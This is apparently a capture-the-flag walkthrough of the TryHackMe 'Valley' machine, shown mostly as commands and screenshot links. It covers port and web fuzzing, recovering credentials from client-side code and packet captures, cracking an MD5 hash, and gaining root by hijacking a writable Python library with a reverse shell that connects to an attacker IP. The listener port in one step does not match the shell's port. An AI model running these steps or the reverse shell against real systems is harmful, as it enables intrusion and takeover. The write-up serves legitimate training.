https://tryhackme.com/room/valleype
>IP:10.10.156.47

# RECON
>nmap -p- 10.10.156.47 -T5 -vv
```
22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
37370/tcp open  unknown syn-ack ttl 63
```

>sudo nmap -sC -sV -Pn 10.10.156.47 -p80,22,37370
```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:84:2a:c1:22:5a:10:f1:66:16:dd:a0:f6:04:62:95 (RSA)
|   256 42:9e:2f:f6:3e:5a:db:51:99:62:71:c4:8c:22:3e:bb (ECDSA)
|_  256 2e:a0:a5:6c:d9:83:e0:01:6c:b9:8a:60:9b:63:86:72 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
37370/tcp open  ftp     vsftpd 3.0.3
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
```

```
http://10.10.156.47/pricing/note.txt
```

![Valley](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Valley/screenshots/20250427083729.png)

ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt:FFUZ -u http://10.10.156.47/FFUZ -ic -c

![Valley](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Valley/screenshots/20250427084201.png)

```
sudo bash -c  'echo "10.10.156.47    valley.thm" > /etc/hosts'
```

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://valley.thm/ -H 'Host: FUZZ.valley.thm' -fs 1163
```

ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FFUZ -u http://valley.thm/static/FFUZ -ic -c -e txt,php

![Valley](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Valley/screenshots/20250427090220.png)
![Valley](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Valley/screenshots/20250427090234.png)
![Valley](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Valley/screenshots/20250427090516.png)
### Обработка данных на стороне клиента 
![Valley](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Valley/screenshots/20250427090634.png)
```
siemDev:california
```
![Valley](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Valley/screenshots/20250427090831.png)

```
get siemFTP.pcapng
get siemHTTP1.pcapng
get siemHTTP2.pcapng
```

```
anonymous:anonymous
```
![Valley](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Valley/screenshots/20250427091229.png)

![Valley](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Valley/screenshots/20250427092411.png)

## siemHTTP2.pcapng

![Valley](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Valley/screenshots/20250427092639.png)

```
valleyDev:ph0t0s1234
```

>ssh valleyDev@10.10.156.47   

# LPE
## Flag1
![Valley](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Valley/screenshots/20250427092927.png)

Linpeas
```
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

```
python3 -m http.server 80
wget http://10.11.134.170/linpeas.sh && chmod +x linpeas.sh  && ./linpeas.sh 
```

==Vulnerable to CVE-2021-3560==
```
root:x:0:0:root:/root:/bin/bash                                                    siemDev:x:1001:1001::/home/siemDev/ftp:/bin/sh
valleyDev:x:1002:1002::/home/valleyDev:/bin/bash
valley:x:1000:1000:,,,:/home/valley:/bin/bash
```
photos/script/photosEncrypt.py 

![Valley](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Valley/screenshots/20250427094104.png)

```
scp valleyDev@10.10.156.47:/home/valleyAuthenticator /tmp 
```

```
strings valleyAuthenticator
```
![Valley](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Valley/screenshots/20250427101205.png)

```
hashcat -m 0 "e6722920bab2326f8217e4bf6b1b58ac" /usr/share/wordlists/rockyou.txt
```
>e6722920bab2326f8217e4bf6b1b58ac:liberty123    
```
uid=1000(valley) gid=1000(valley) groups=1000(valley),1003(valleyAdmin)
```

```
valleyDev@valley:/home$ ls -la /photos/script/photosEncrypt.py 
-rwxr-xr-x 1 root root 621 Mar  6  2023 /photos/script/photosEncrypt.py


valleyDev@valley:/home$ cat /photos/script/photosEncrypt.py 

#!/usr/bin/python3
import base64
for i in range(1,7):
# specify the path to the image file you want to encode
        image_path = "/photos/p" + str(i) + ".jpg"

# open the image file and read its contents
        with open(image_path, "rb") as image_file:
          image_data = image_file.read()

# encode the image data in Base64 format
        encoded_image_data = base64.b64encode(image_data)

# specify the path to the output file
        output_path = "/photos/photoVault/p" + str(i) + ".enc"

# write the Base64-encoded image data to the output file
        with open(output_path, "wb") as output_file:
          output_file.write(encoded_image_data)

```

-rwxrwxr-x 1 root valleyAdmin 20382 Mar 13  2023 /usr/lib/python3.8/base64.py

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.20.14.77",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

```
nc -lnvp 1337
```

![Valley](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Valley/screenshots/20250427103329.png)
![Valley](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Valley/screenshots/20250427103429.png)